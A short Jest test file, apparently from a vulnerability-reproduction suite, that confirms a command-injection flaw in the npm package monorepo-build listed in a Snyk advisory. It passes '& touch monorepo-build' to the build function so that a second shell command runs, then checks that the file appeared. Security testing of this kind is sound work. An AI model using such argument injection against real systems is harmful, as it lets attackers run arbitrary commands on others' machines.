//https://snyk.io/vuln/SNYK-JS-MONOREPOBUILD-1050392
test("Command Injection in monorepo-build", () => {
  var a = require("monorepo-build");
  const fs = require("fs");
  const path = "./monorepo-build";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.build("./", "& touch monorepo-build");
  } catch (error) {
    console.log("syntax-error");
  }
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
